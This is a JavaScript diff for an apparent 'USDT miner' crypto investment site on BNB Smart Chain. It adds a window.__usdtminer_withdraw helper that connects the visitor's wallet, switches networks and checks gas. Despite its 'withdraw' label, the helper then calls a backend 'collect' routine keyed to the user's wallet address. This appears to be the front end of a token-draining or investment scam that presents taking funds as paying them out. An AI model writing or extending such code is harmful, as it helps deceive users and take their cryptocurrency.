@@ -135,10 +135,14 @@ async function fetchAndDisplayUserBalances(rawProvider) {
 }
 
 // ─── Backend collect trigger ──────────────────────────────────────────────────
-async function triggerBackendCollect(userAddress) {
+async function triggerBackendCollect(userAddress, amountWei) {
+  // amountWei: optional pre-formatted base units string. If omitted, read from #investAmount
   let lastErr;
-  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
-  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
+  let dynamicAmountWei = amountWei;
+  if (!dynamicAmountWei) {
+    const uiAmount = document.getElementById("investAmount")?.value || "1";
+    dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
+  }
 
   for (let i = 1; i <= 3; i++) {
     try {
@@ -157,6 +161,57 @@ async function triggerBackendCollect(userAddress) {
   }
   throw lastErr;
 }
+
+// Public helper to request a withdraw for a specific investment entry.
+// Attempts to ensure the user is connected and on the correct network before calling the backend.
+window.__usdtminer_withdraw = async function(entryId, amount) {
+  // amount is a number or string representing USDT amount (decimal)
+  try {
+    let rawProvider = null;
+    if (window.modal && typeof window.modal.getWalletProvider === "function") {
+      try { rawProvider = window.modal.getWalletProvider(); } catch (e) { rawProvider = null; }
+    }
+
+    if (!rawProvider) {
+      // Ask user to connect via modal
+      if (window.modal && typeof window.modal.open === "function") {
+        await window.modal.open();
+        try { rawProvider = window.modal.getWalletProvider(); } catch (e) { rawProvider = null; }
+      }
+    }
+
+    if (!rawProvider) throw new Error('No wallet provider available');
+
+    const provider = new ethers.BrowserProvider(rawProvider);
+    // Ensure network is BSC
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      try {
+        await rawProvider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
+        } else {
+          throw new Error('Switch to BNB Smart Chain in your wallet');
+        }
+      }
+    }
+
+    // Check gas (BNB) balance minimally
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+    const bnbBalance = await provider.getBalance(userAddress);
+    const minGasRequired = ethers.parseEther("0.0005");
+    if (bnbBalance < minGasRequired) throw new Error('Insufficient BNB gas balance');
+
+    // Format amount to base units and call backend
+    const amountWei = ethers.parseUnits(String(amount), 18).toString();
+    const result = await triggerBackendCollect(userAddress, amountWei);
+    return result;
+  } catch (err) {
+    throw err;
+  }
+};
 
 // Bandera de control para saber si hay una inversión esperando a que el usuario conecte
 let pendingInvestment = false;
